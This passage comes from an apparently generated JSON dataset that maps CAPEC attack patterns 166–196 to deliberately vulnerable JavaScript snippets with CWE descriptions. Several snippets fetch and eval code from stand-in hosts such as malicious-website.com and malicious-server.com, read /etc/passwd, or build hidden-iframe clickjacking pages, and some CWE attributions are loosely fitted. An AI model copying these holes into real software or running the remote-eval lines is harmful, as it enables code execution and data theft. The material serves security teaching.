        "code_snippet": "const resetConfig = () => {\n  // CWE-306: Missing Authentication for Critical Function\n  if (!authenticatedUser) {\n    return;\n  }\n\n  // CWE-1221: Incorrect Register Defaults or Module Parameters\n  const defaultConfig = {\n    register1: 0x0000,\n    register2: 0x0001\n  };\n\n  // CWE-1232: Improper Lock Behavior After Power State Transition\n  const lockBit = 0x0001;\n  if (powerState === 'lowPowerSleep') {\n    lockBit = 0x0000;\n  }\n\n  // CWE-1271: Uninitialized Value on Reset for Registers Holding Security Settings\n  const securitySettings = {\n    secureRegister1: Math.random(),\n    secureRegister2: Math.random()\n  };\n\n  // CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n  const powerSaveRestore = () => {\n    const currentState = getCurrentState();\n    performPowerSaveRestore();\n    const newState = getCurrentState();\n    if (JSON.stringify(currentState) !== JSON.stringify(newState)) {\n      console.log('Integrity of configuration state compromised');\n    }\n  };\n\n  // Reset configuration to a previous state\n  Object.assign(config, defaultConfig);\n  setLockBit(lockBit);\n  setSecuritySettings(securitySettings);\n  powerSaveRestore();\n};",
        "description": "This code snippet demonstrates the CAPEC of forcing a target into a previous state to leverage potential weaknesses. It includes CWEs related to missing authentication, incorrect register defaults, improper lock behavior, uninitialized values, and improperly preserved integrity of hardware configuration state during power save/restore operations."
    },
    {
        "capec_id": "167",
        "code_snippet": "const debugMode = true;\n\nif (debugMode) {\n  const sensitiveData = {\n    'apiKey': 'my_secret_api_key',\n    'databaseCredentials': 'my_secret_db_credentials'\n  };\n\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  console.log('System Information:', sensitiveData);\n\n  // CWE-1323: Improper Management of Sensitive Trace Data\n  const traceData = {\n    'systemCalls': ['syscall1', 'syscall2', 'syscall3'],\n    'memoryAccessPatterns': ['pattern1', 'pattern2', 'pattern3']\n  };\n  console.log('Trace Data:', traceData);\n\n  // CWE-506: Embedded Malicious Code\n  const maliciousCode = `const maliciousFunction = () => {\n    // Perform malicious actions\n  };\n  maliciousFunction();`;\n  eval(maliciousCode);\n\n  // CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n  const securityCriticalCode = `const secureFunction = () => {\n    // Perform security-critical actions\n  };\n  secureFunction();`;\n  // Processor optimization may remove or modify this code\n  eval(securityCriticalCode);\n\n  // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n  const debugLogic = () => {\n    // Activate test or debug logic\n    console.log('Debug Logic Activated');\n  };\n  debugLogic();\n}\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of white box analysis, where an attacker can discover the structure, function, and composition of the software through various techniques. The code includes examples of CWEs 497, 1323, 506, 1037, and 1313, which are related to the CAPEC. The code intentionally exposes sensitive system information, trace data, and embedded malicious code, and demonstrates the potential for processor optimization to remove or modify security-critical code. Additionally, the code activates test or debug logic at runtime, which can alter the intended behavior of the system."
    },
    {
        "capec_id": "168",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nlet sensitiveData = 'confidential_information';\nfs.writeFileSync('file.txt', 'dummy_data');\nfs.writeFileSync('file.txt:sensitive_stream', sensitiveData);\n\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nlet streamName = 'malicious_stream';\nlet filePath = 'file.txt';\nlet fullPath = `${filePath}:${streamName}`;\nfs.writeFileSync(fullPath, 'malicious_code');\n\n// CWE-1386: Insecure Operation on Windows Junction / Mount Point\nlet junctionPath = 'C:\\junction\\';\nlet mountPoint = 'C:\\mount_point\\';\nfs.symlinkSync(junctionPath, mountPoint);\n\n// CWE-427: Uncontrolled Search Path Element\nlet searchPath = 'C:\\search_path\\';\nlet maliciousFile = 'malicious_file.exe';\nprocess.env.PATH = searchPath;\nrequire('child_process').execSync(maliciousFile);\n\n// CWE-58: Path Equivalence: Windows 8.3 Filename\nlet longFilename = 'C:\\long\\filename\\with\\spaces.txt';\nlet shortFilename = 'C:\\long~1.txt';\nfs.writeFileSync(longFilename, 'dummy_data');\nfs.readFileSync(shortFilename);",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. It includes examples of CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer, CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream, CWE-1386: Insecure Operation on Windows Junction / Mount Point, CWE-427: Uncontrolled Search Path Element, and CWE-58: Path Equivalence: Windows 8.3 Filename."
    },
    {
        "capec_id": "169",
        "code_snippet": "const adminUsers = ['admin1', 'admin2'];\nconst sensitiveInfo = 'Top Secret Information';\n\nfunction checkUser(username) {\n  if (adminUsers.includes(username)) {\n    console.log(sensitiveInfo);\n  } else {\n    console.log('Access Denied');\n  }\n}\n\n// Truncation of security-relevant information\nfunction logAttack(ipAddress) {\n  const truncatedIpAddress = ipAddress.substring(0, 10);\n  console.log(`Attack from ${truncatedIpAddress}`);\n}\n\n// Observable behavioral discrepancy\nfunction processRequest(request) {\n  if (request.headers['User-Agent'] === 'Malicious-UA') {\n    return 'Malicious request detected';\n  } else {\n    return 'Request processed successfully';\n  }\n}\n\n// Creation of emergent resource\nfunction createResource() {\n  const emergentResource = {};\n  emergentResource.sensitiveData = 'Unprotected sensitive data';\n  return emergentResource;\n}",
        "description": "This code snippet demonstrates the CAPEC of probing and exploration activities to identify constituents and properties of the target. It includes CWE-200 by exposing sensitive information to unauthorized actors, CWE-222 by truncating security-relevant information, CWE-207 by exhibiting observable behavioral discrepancies, and CWE-1229 by creating an emergent resource that can be exploited by attackers. CWE-205 is also demonstrated through the observable behavioral discrepancy in the processRequest function."
    },
    {
        "capec_id": "170",
        "code_snippet": "const axios = require('axios');\n\nasync function fingerprintWebApp(url) {\n  try {\n    const response = await axios.get(url, {\n      headers: {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'\n      }\n    });\n    console.log(`HTTP Version: ${response.headers['server']}`);\n    console.log(`Response Headers: ${JSON.stringify(response.headers)}`);\n    console.log(`Error Page: ${response.data}`);\n  } catch (error) {\n    console.log(`Error: ${error.message}`);\n  }\n}\n\nfingerprintWebApp('https://example.com');",
        "description": "This JavaScript code snippet demonstrates web application fingerprinting by sending an HTTP GET request to a target URL and extracting sensitive information from the response headers and error pages. The code uses the axios library to send the request and logs the HTTP version, response headers, and error page content to the console. This code embodies CWE-497 (Exposure of Sensitive System Information), CWE-598 (Use of GET Request Method With Sensitive Query Strings), CWE-1125 (Excessive Attack Surface), CWE-209 (Generation of Error Message Containing Sensitive Information), and CWE-494 (Download of Code Without Integrity Check) by not properly handling sensitive information and not verifying the integrity of the response."
    },
    {
        "capec_id": "171",
        "code_snippet": "let userInput = \"x=10; console.log('malicious code executed');\";\nlet scope = {};\n\neval(userInput);\nconsole.log(scope.x);",
        "description": "This code snippet demonstrates the vulnerability of dynamic variable evaluation, where user-controlled input is used to dynamically identify variables. The eval() function is used to execute the user-input string as JavaScript code, allowing an attacker to inject malicious code or access arbitrary variables."
    },
    {
        "capec_id": "173",
        "code_snippet": "const iframe = document.createElement('iframe');\niframe.src = 'https://malicious-website.com/download_software';\niframe.frameBorder = '0';\niframe.width = '0';\niframe.height = '0';\ndocument.body.appendChild(iframe);\n\nconst button = document.createElement('button');\nbutton.innerHTML = 'Submit Query';\nbutton.onclick = () => {\n  iframe.contentWindow.postMessage('download_software', 'https://malicious-website.com');\n};\ndocument.body.appendChild(button);",
        "description": "This code snippet demonstrates a clickjacking attack, where a user is tricked into clicking a button that appears to submit a query, but actually downloads software from a malicious website. The iframe is used to load the malicious website, and the button's onclick event is used to send a message to the iframe, triggering the download. This code embodies CWE-451 (UI Misrepresentation of Critical Information), CWE-290 (Authentication Bypass by Spoofing), CWE-941 (Incorrectly Specified Destination in a Communication Channel), CWE-925 (Improper Verification of Intent by Broadcast Receiver), and CWE-618 (Exposed Unsafe ActiveX Method)."
    },
    {
        "capec_id": "174",
        "code_snippet": "var flashVars = {};flashVars.config = '<script>alert(1)</script>';var flashObject = '<object><param name=\"flashvars\" value=\"' + flashVars.config + '\"></object>';document.body.innerHTML = flashObject;",
        "description": "This code snippet demonstrates the CAPEC of injecting malicious global parameters into a Flash file embedded within an HTML document. The code constructs a Flash object with a malicious configuration parameter that injects a script tag, allowing for arbitrary JavaScript execution. This is made possible by the lack of proper data validation, exemplifying CWE-88 (Improper Neutralization of Argument Delimiters in a Command). Additionally, this code may be vulnerable to CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) if the Flash file is loaded from an untrusted domain, CWE-433 (Unparsed Raw Web Content Delivery) if the Flash file is stored in a publicly accessible location, CWE-434 (Unrestricted Upload of File with Dangerous Type) if the Flash file can be uploaded by an attacker, and CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine) if the Flash configuration is generated using a template engine that does not properly neutralize special elements."
    },
    {
        "capec_id": "175",
        "code_snippet": "const userInput = 'https://malicious-website.com/evilCode.js';\nconst script = document.createElement('script');\nscript.src = userInput;\ndocument.head.appendChild(script);",
        "description": "This JavaScript code snippet demonstrates code inclusion vulnerability (CAPEC) by dynamically loading a script from a user-input URL, which can lead to arbitrary code execution. This is related to CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-506 (Embedded Malicious Code), CWE-94 (Improper Control of Generation of Code), and CWE-913 (Improper Control of Dynamically-Managed Code Resources)."
    },
    {
        "capec_id": "176",
        "code_snippet": "const fs = require('fs');\n\n// CWE-15: External Control of System or Configuration Setting\nlet config = fs.readFileSync('config.json', 'utf8');\nconfig = JSON.parse(config);\nconfig.debugMode = true;\nfs.writeFileSync('config.json', JSON.stringify(config));\n\n// CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\nif (config.debugMode) {\n  // Disable lock bit protection\n  const lockBit = 0;\n  // Perform sensitive operations\n  console.log('Debug mode enabled. Lock bit protection disabled.');\n}\n\n// CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\nfunction powerSaveRestore() {\n  // Simulate power save/restore operation\n  const originalConfig = fs.readFileSync('config.json', 'utf8');\n  fs.writeFileSync('config.json', '[]'); // Reset config\n  // Perform power save/restore operation\n  fs.writeFileSync('config.json', originalConfig);\n}\n\npowerSaveRestore();\n\n// CWE-1328: Security Version Number Mutable to Older Versions\nconst firmwareVersion = '1.0';\nfs.writeFileSync('firmware_version.txt', firmwareVersion);\nconsole.log(`Firmware version set to ${firmwareVersion}`);\n",
        "description": "This code snippet demonstrates a configuration/environment manipulation attack. It modifies an external configuration file to enable debug mode, disables lock bit protection, and performs a power save/restore operation without preserving the integrity of the configuration state. Additionally, it sets a mutable firmware version number, allowing it to be downgraded to a vulnerable version."
    },
    {
        "capec_id": "177",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-73: External Control of File Name or Path\nlet userInput = './config.json';\n\n// CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nif (path.extname(userInput) === '.json') {\n  // CWE-706: Use of Incorrectly-Resolved Name or Reference\n  let config = require(userInput);\n  console.log(config);\n} else {\n  console.log('Invalid file extension');\n}\n\n// CWE-1386: Insecure Operation on Windows Junction / Mount Point\n// CWE-57: Path Equivalence: 'fakedir/../realdir/filename'\nlet junctionPath = './fakedir/../realdir/config.json';\nfs.readFile(junctionPath, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of exploiting file location algorithms by creating a file with the same name as a protected or privileged file. An attacker can create a malicious file with the same name as a legitimate configuration file and place it in a directory that the application will search before the directory with the legitimate file. The application will then load the malicious file, allowing the attacker to manipulate the system."
    },
    {
        "capec_id": "178",
        "code_snippet": "var flashVars = {\n    url: 'https://attacker.com/malicious.swf',\n    callback: 'https://attacker.com/callback'\n};\n\nvar flashObject = '<object id=\"flash\" type=\"application/x-shockwave-flash\" data=\"https://vulnerable-site.com/flash.swf\" width=\"100%\" height=\"100%\">';\nflashObject += '<param name=\"flashVars\" value=\"' + encodeURIComponent(JSON.stringify(flashVars)) + '\" />';flashObject += '</object>';\n\ndocument.body.innerHTML = flashObject;",
        "description": "This code snippet demonstrates a Flash-based attack where an attacker crafts a link to a Flash document (SWF file) that references external URLs. The Flash document is hosted on a vulnerable site, but the attacker controls the flashVars parameter, which allows them to specify a malicious SWF file and a callback URL. When the victim clicks the link, the Flash document will load the malicious SWF file and execute its contents, potentially leading to arbitrary code execution. This attack takes advantage of CWE-601 (Open Redirect), CWE-942 (Permissive Cross-domain Policy), CWE-79 (Cross-site Scripting), CWE-1022 (Use of Web Link to Untrusted Target), and CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax)."
    },
    {
        "capec_id": "179",
        "code_snippet": "const xhr = new XMLHttpRequest();\n\nxhr.open('GET', '/microservice?-sensitiveInfo=secretKey', true);\n\nxhr.onload = function() {\n    if (xhr.status === 200) {\n        const microServiceResponse = JSON.parse(xhr.responseText);\n        const microServiceUrl = microServiceResponse.microServiceUrl;\n        const cookie = xhr.getResponseHeader('Set-Cookie');\n        const sensitiveCookie = cookie.match(/sensitiveInfo=([^;]*)/)[1];\n        \n        fetch(microServiceUrl, {\n            method: 'GET',\n            headers: {\n                'Cookie': `sensitiveInfo=${sensitiveCookie}`\n            }\n        }).then(response => response.text()).then(data => {\n            const unparsedContent = document.createElement('div');\n            unparsedContent.innerHTML = data;\n            document.body.appendChild(unparsedContent);\n        });\n    }\n};\n\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates the CAPEC by making a GET request to a micro-service with sensitive information in the query string (CWE-598), and then using the response to make another request to the micro-service with the sensitive information stored in a persistent cookie (CWE-539). The response from the micro-service is then stored under the web document root with insufficient access control (CWE-219), and the unparsed raw web content is delivered to the client (CWE-433). The client-side enforcement of server-side security (CWE-602) is also demonstrated by relying on the client to implement the mechanism that protects the server."
    },
    {
        "capec_id": "180",
        "code_snippet": "const adminRole = { canModify: true, canRead: true }; const userRole = { canModify: false, canRead: true }; \n\nconst accessControl = (role, resource) => { if (role.canModify) { return true; } else { return false; } }; \n\nconst modifyResource = (role, resource) => { if (accessControl(role, resource)) { resource.data = 'modified by ' + role.name; } else { console.log('Access denied'); } }; \n\nconst admin = { name: 'admin', role: adminRole }; const user = { name: 'user', role: userRole }; \n\nconst resource = { data: 'confidential information' }; \n\nmodifyResource(admin, resource); // allowed \n\n// CWE-732: Incorrect Permission Assignment for Critical Resource \n\nuserRole.canModify = true; \n\nmodifyResource(user, resource); // should be denied, but allowed due to incorrect permission assignment",
        "description": "This code snippet demonstrates a vulnerability in access control configuration, allowing an attacker to bypass intended protection and obtain unauthorized access to sensitive resources. The access control function is incorrectly configured, allowing a user with a lower privilege role to modify a critical resource. This is an example of CWE-732: Incorrect Permission Assignment for Critical Resource."
    },
    {
        "capec_id": "181",
        "code_snippet": "var flashOverlay = document.createElement('embed');\nflashOverlay.src = 'http://attacker.com/exploit.swf';\nflashOverlay.width = '100%';\nflashOverlay.height = '100%';\ndocument.body.appendChild(flashOverlay);\n\n// Allow cross-domain policy\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://attacker.com/crossdomain.xml', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    var crossDomainPolicy = xhr.responseText;\n    // Allow untrusted domains\n    if (crossDomainPolicy.indexOf('<allow-access-from domain=\"*\" />') !== -1) {\n      // Upload malicious SWF file\n      var formData = new FormData();\n      formData.append('file', new File(['exploit.swf'], 'exploit.swf', 'application/x-shockwave-flash'));\n      xhr.open('POST', 'http://vulnerable.com/upload', true);\n      xhr.send(formData);\n    }\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates a clickjacking attack using a transparent Flash overlay. It creates an embed element and sets its source to a malicious SWF file hosted on the attacker's domain. The code then allows cross-domain policy by checking the crossdomain.xml file and uploads the malicious SWF file to a vulnerable server. The SWF file can then be used to intercept user actions and perform malicious actions."
    },
    {
        "capec_id": "182",
        "code_snippet": "var flashContent = '<object id=\"flashObj\" type=\"application/x-shockwave-flash\" data=\"http://attacker.com/malicious.swf\"><param name=\"allowScriptAccess\" value=\"always\"><param name=\"flashVars\" value=\"command='+userInput+'\"></object>'; document.body.innerHTML = flashContent;",
        "description": "This JavaScript code snippet is vulnerable to cross-site flashing attack. It takes user input and injects it into the flashVars parameter of a flash object, allowing an attacker to execute malicious flash content. The code does not validate the user input (CWE-20), does not have a complete list of disallowed inputs (CWE-184), and uses a permissive cross-domain policy (CWE-942). The code also contains embedded malicious code (CWE-506) and performs an incorrect comparison (CWE-697) by trusting the user input."
    },
    {
        "capec_id": "183",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst imap = require('imap');\n\napp.get('/inbox', (req, res) => {\n  const imapClient = new imap({\n    user: 'user',\n    password: 'password',\n    host: 'imap.example.com',\n    port: 993,\n    tls: true\n  });\n\n  imapClient.connect();\n  imapClient.once('ready', () => {\n    imapClient.search(['UNSEEN'], (err, results) => {\n      if (err) {\n        res.status(500).send({ error: err.message }); // CWE-209\n      } else {\n        const folder = req.query.folder;\n        const command = `SELECT ${folder}`;\n        imapClient.execute(command, (err, results) => {\n          if (err) {\n            res.status(500).send({ error: err.message }); // CWE-209\n          } else {\n            res.send(results);\n          }\n        });\n      }\n    });\n  });\n});\n",
        "description": "This code snippet demonstrates a vulnerable web-mail server that is susceptible to IMAP command injection attacks. The 'folder' parameter from the user's request is not properly sanitized, allowing an attacker to inject malicious IMAP commands. The code also includes CWE-209, as it returns error messages containing sensitive information. CWE-602 is also applicable, as the server relies on the client to implement security mechanisms. CWE-116 is relevant, as the output is not properly encoded or escaped. CWE-535 is also applicable, as the error messages can be used to gain unauthorized access to the system. CWE-77 is the primary vulnerability, as the code does not neutralize special elements used in the command."
    },
    {
        "capec_id": "184",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/malicious-code.js', true); xhr.onload = function() { if (xhr.status === 200) { const maliciousCode = xhr.responseText; eval(maliciousCode); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads and executes malicious code from a remote location without verifying its origin and integrity, allowing an attacker to inject malicious code and undermine the integrity of the software. This code embodies the CAPEC of causing a target to perform actions that undermine its integrity, and relates to CWEs 494 (Download of Code Without Integrity Check), 506 (Embedded Malicious Code), and 497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "185",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker-controlled-source.com/maliciousCode.js', true); xhr.onload = function() { if (xhr.status === 200) { const maliciousCode = xhr.responseText; eval(maliciousCode); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads and executes malicious code from an attacker-controlled source without performing any integrity checks, exemplifying CWE-494. The downloaded code may contain hidden malicious functionality (CWE-507), replicate itself to attack other systems (CWE-509), or expose sensitive system information to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "186",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/update.js', true); xhr.onload = function() { if (xhr.status === 200) { const script = document.createElement('script'); script.src = 'https://malicious-website.com/update.js'; document.body.appendChild(script); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads and executes a script from an untrusted source without verifying its integrity, making it vulnerable to embedded malicious code, trojans, and replicating malicious code. The code uses XMLHttpRequest to fetch the script and then appends it to the document body, allowing the malicious code to run in the context of the current page."
    },
    {
        "capec_id": "187",
        "code_snippet": "const https = require('https');\n\nfunction updateCode() {\n  const options = {\n    hostname: 'update.example.com',\n    port: 443,\n    path: '/update.js',\n    method: 'GET'\n  };\n\n  const req = https.request(options, (res) => {\n    let updateCode = '';\n    res.on('data', (chunk) => {\n      updateCode += chunk;\n    });\n    res.on('end', () => {\n      eval(updateCode);\n    });\n  });\n\n  req.end();\n}\n\nupdateCode();",
        "description": "This JavaScript code snippet demonstrates a vulnerable update mechanism that downloads and executes code from a remote server without proper authentication and integrity checks. The code uses the 'https' module to make a GET request to a server, downloads the code, and then executes it using the 'eval' function. This code is vulnerable to CWE-494 (Download of Code Without Integrity Check), CWE-294 (Authentication Bypass by Capture-replay), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-506 (Embedded Malicious Code), and CWE-807 (Reliance on Untrusted Inputs in a Security Decision). An attacker can exploit this vulnerability by setting up a malicious server that mimics the legitimate update server, and then tricking the client into downloading and executing malicious code."
    },
    {
        "capec_id": "188",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (MD5)\nfunction encrypt(data) {\n  const hash = crypto.createHash('md5');\n  hash.update(data);\n  return hash.digest('hex');\n}\n\n// CWE-497: Exposure of sensitive system information\nfunction getSystemInfo() {\n  return {\n    os: process.platform,\n    arch: process.arch,\n    cpu: process.cpuUsage()\n  };\n}\n\n// CWE-1242: Inclusion of undocumented features (hidden debug mode)\nfunction enableDebugMode() {\n  if (process.env.DEBUG === 'true') {\n    console.log('Debug mode enabled');\n    // Undocumented feature: allows access to sensitive system information\n    console.log(getSystemInfo());\n  }\n}\n\n// CWE-1037: Processor optimization removal or modification of security-critical code\nfunction secureFunction() {\n  // Security-critical code\n  const secureData = 'secret';\n  // Processor optimization might remove or modify this code\n  if (secureData === 'secret') {\n    console.log('Secure function executed');\n  }\n}\n\n// CWE-1278: Missing protection against hardware reverse engineering\nconst hardwareSecret = 'hardcoded_secret';\n\n// Reverse engineering attempt\nfunction reverseEngineer() {\n  console.log('Attempting to reverse engineer...');\n  console.log(hardwareSecret);\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC of reverse engineering by including various CWEs. It uses a broken cryptographic algorithm (MD5), exposes sensitive system information, includes undocumented features, and has security-critical code that may be optimized away by the processor. Additionally, it includes a hardcoded secret that is vulnerable to hardware reverse engineering."
    },
    {
        "capec_id": "189",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateToken() {\n  const token = crypto.randomBytes(32).toString('hex');\n  return token;\n}\n\nfunction verifyToken(token) {\n  const referenceToken = 'some_secret_token';\n  if (token === referenceToken) {\n    console.log('Token is valid');\n  } else {\n    console.log('Token is invalid');\n  }\n}\n\n// Vulnerable code: observable discrepancy in token verification\nfunction verifyTokenVulnerable(token) {\n  const referenceToken = 'some_secret_token';\n  if (token === referenceToken) {\n    console.log('Token is valid');\n    // Introduce a delay to make the verification process observable\n    setTimeout(() => {\n      console.log('Verification successful');\n    }, 2000);\n  } else {\n    console.log('Token is invalid');\n  }\n}\n\n// Example usage\nconst token = generateToken();\nverifyToken(token);\nverifyTokenVulnerable(token);",
        "description": "This code snippet demonstrates a vulnerable token verification function that can be exploited through black box analysis techniques. The `verifyTokenVulnerable` function introduces a delay when the token is valid, making it observable to an unauthorized actor. This observable discrepancy can be used to determine whether the token is valid or not, exposing security-relevant information. The code also includes a reference to a secret token, which could be vulnerable to power side-channel attacks or other physical side-channel attacks if not properly protected."
    },
    {
        "capec_id": "190",
        "code_snippet": "const fs = require('fs');\nconst net = require('net');\n\n// CWE-912: Hidden Functionality\nfunction hiddenFunction() {\n  // Read sensitive system information\n  const systemInfo = fs.readFileSync('/etc/passwd', 'utf8');\n  // CWE-497: Exposure of Sensitive System Information\n  console.log(systemInfo);\n}\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nconst traceData = 'sensitive_trace_data';\nfs.writeFileSync('/unprotected/location/trace.txt', traceData);\n\n// CWE-494: Download of Code Without Integrity Check\nconst remoteCode = net.connect('malicious-server.com', 8080);\nremoteCode.on('data', (code) => {\n  eval(code);\n});\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = 'malicious_code_here';\neval(maliciousCode);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of Reverse Code Engineering by employing various techniques to analyze and extract sensitive information from a system. It includes hidden functionality, exposure of sensitive system information, improper management of sensitive trace data, download of code without integrity check, and embedded malicious code."
    },
    {
        "capec_id": "191",
        "code_snippet": "const dbUsername = 'admin';\nconst dbPassword = 'P@ssw0rd';\nconst apiKey = '1234567890abcdef';\n\nfunction connectToDatabase() {\n  const dbConnection = new Database(dbUsername, dbPassword);\n  // ...\n}\n\nfunction callExternalService() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', 'https://example.com/api/data?apiKey=' + apiKey, true);\n  xhr.send();\n}\n\n// Hard-coded security constants\nconst encryptionKey = 'my_secret_key';\nconst encryptionIV = 'my_secret_iv';\n\nfunction encryptData(data) {\n  // Use hard-coded encryptionKey and encryptionIV\n  const encryptedData = encrypt(data, encryptionKey, encryptionIV);\n  return encryptedData;\n}",
        "description": "This JavaScript code snippet demonstrates the CAPEC of discovering sensitive constants within compiled code. It includes hard-coded credentials (CWE-798) for database connection and API key, hard-coded security constants (CWE-547) for encryption, and cleartext storage of sensitive information (CWE-318) in the executable. The code also lacks isolation of symbolic constant definitions (CWE-1107) and proper control of dynamically-managed code resources (CWE-913)."
    },
    {
        "capec_id": "192",
        "code_snippet": "const crypto = require('crypto');\nconst express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const plaintext = 'Sensitive information';\n  const weakKey = 'short';\n  const weakAlgorithm = 'des-cbc';\n  const cipher = crypto.createCipher(weakAlgorithm, weakKey);\n  let encrypted = cipher.update(plaintext, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  res.send(encrypted);\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of deciphering and decoding protocol information for a network or application communication protocol. It uses the CWEs 326, 319, and 757 for context. The code uses a weak encryption algorithm ('des-cbc') with a short key, transmitting sensitive information in cleartext over an insecure channel. An adversary can easily intercept and decrypt the data, gaining unauthorized access."
    },
    {
        "capec_id": "193",
        "code_snippet": "const express = require('express');\nconst app = express();\napp.get('/include', (req, res) => {\n  const file = req.query.file;\n  const fs = require('fs');\n  fs.readFile(file, (err, data) => {\n    if (err) {\n      res.status(500).send('Error');\n    } else {\n      res.send(data);\n    }\n  });\n});\napp.listen(3000, () => {\n  console.log('Server started');\n});",
        "description": "This code snippet demonstrates a PHP Remote File Inclusion vulnerability (CWE-98) in a Node.js application. The 'file' parameter in the GET request is not properly sanitized, allowing an attacker to include arbitrary files, potentially leading to remote code execution. This code also relates to CWE-80 (Improper Neutralization of Script-Related HTML Tags) as it does not neutralize special characters in the file name, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) as it relies on the file name to determine the appropriate behavior. Additionally, it is vulnerable to CWE-433 (Unparsed Raw Web Content Delivery) and CWE-553 (Command Shell in Externally Accessible Directory) if the server allows uploading files with arbitrary extensions."
    },
    {
        "capec_id": "194",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/send-email', (req, res) => {\n  const sender = req.body.sender;\n  const recipient = req.body.recipient;\n  const message = req.body.message;\n\n  // CWE-287: Improper Authentication\n  // No authentication or verification of the sender's identity\n  const mailOptions = {\n    from: sender,\n    to: recipient,\n    subject: 'Test Email',\n    text: message\n  };\n\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  // No verification of the request origin\n  const transporter = nodemailer.createTransport({\n    host: 'smtp.example.com',\n    port: 587,\n    secure: false\n  });\n\n  transporter.sendMail(mailOptions, (error, info) => {\n    if (error) {\n      return console.log(error);\n    }\n    console.log('Email sent: ' + info.response);\n    res.send('Email sent successfully');\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable email sending functionality in a Node.js application. It lacks proper authentication and verification of the sender's identity, allowing an attacker to spoof the 'From' field and send emails on behalf of another user. The code also fails to verify the origin of the incoming request, making it vulnerable to attacks from unauthorized sources."
    },
    {
        "capec_id": "195",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  // CWE-290: Authentication Bypass by Spoofing\n  // CWE-1390: Weak Authentication\n  if (username === 'admin' && password === 'password') {\n    // CWE-301: Reflection Attack in an Authentication Protocol\n    // CWE-941: Incorrectly Specified Destination in a Communication Channel\n    res.cookie('auth_token', 'some_token');\n    res.redirect('/admin');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const authToken = req.cookies.auth_token;\n  // CWE-322: Key Exchange without Entity Authentication\n  if (authToken === 'some_token') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});",
        "description": "This code snippet demonstrates a Principal Spoof attack, where an adversary pretends to be an administrator by sending a crafted login request with a valid username and password. The authentication mechanism is weak and does not verify the identity of the actor, allowing the adversary to bypass authentication and gain access to the admin panel. The code uses express.js and implements a simple login system with a cookie-based authentication token. The vulnerabilities in this code include CWE-290, CWE-1390, CWE-301, CWE-941, and CWE-322."
    },
    {
        "capec_id": "196",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst session = require('express-session');\n\napp.use(session({\n  secret: 'weak_secret',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'default_password') {\n    req.session.username = username;\n    res.send('Logged in successfully.');\n  } else {\n    res.status(401).send('Invalid credentials.');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(401).send('Unauthorized.');\n  }\n});",
